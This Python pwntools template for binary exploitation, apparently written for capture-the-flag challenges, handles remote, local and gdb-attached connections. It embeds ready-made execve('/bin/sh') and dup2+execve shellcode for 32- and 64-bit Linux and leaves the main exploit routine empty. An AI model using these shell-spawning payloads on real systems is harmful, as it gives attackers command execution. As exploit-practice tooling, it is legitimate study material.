from pwn import *
from enert import *

# =========================
# TEMPLATE FOR EXPLOITATION
# =========================
context(os="linux", arch="ARCH NAME HERE")
context.log_level = "debug" # output verbose log
BINARY = "BINARY NAME HERE"
#R_LIBC = "./libc.so.6-hoge"
L_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
R_HOST = "178.62.249.106"
R_PORT = 8642
L_HOST = "localhost"
L_PORT = 4444
elf    = ELF(BINARY)
s      = None
if len(sys.argv) > 1 and sys.argv[1] == "r":
    s = remote(R_HOST, R_PORT)
    #libc = ELF(R_LIBC)
elif len(sys.argv) > 1 and sys.argv[1] == "l":
    s = process(elf)
    libc = ELF(L_LIBC)
else:
    s = remote(L_HOST, L_PORT)
    libc = ELF(L_LIBC)

if len(sys.argv) > 1 and sys.argv[1] == "d":
    s = remote(L_HOST, L_PORT)
    f = open("gdbrc", "r")
    time.sleep(0.5)
    pid = proc.pid_by_name(BINARY)
    gdb.attach(pid[0], f)

sc_execve32 = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_execve64 = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"
sc_dup2execve32 = "\x31\xd2\x31\xc9\x8d\x5a\x04\x8d\x42\x3f\xcd\x80\x41\x8d\x42\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
sc_dup2execve64 = "\x31\xd2\x31\xf6\x67\x8d\x7a\x04\x67\x8d\x42\x21\x0f\x05\xff\xc6\x67\x8d\x42\x21\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"

# =========================
# MAIN EXPLOITATION ROUTINE
# =========================
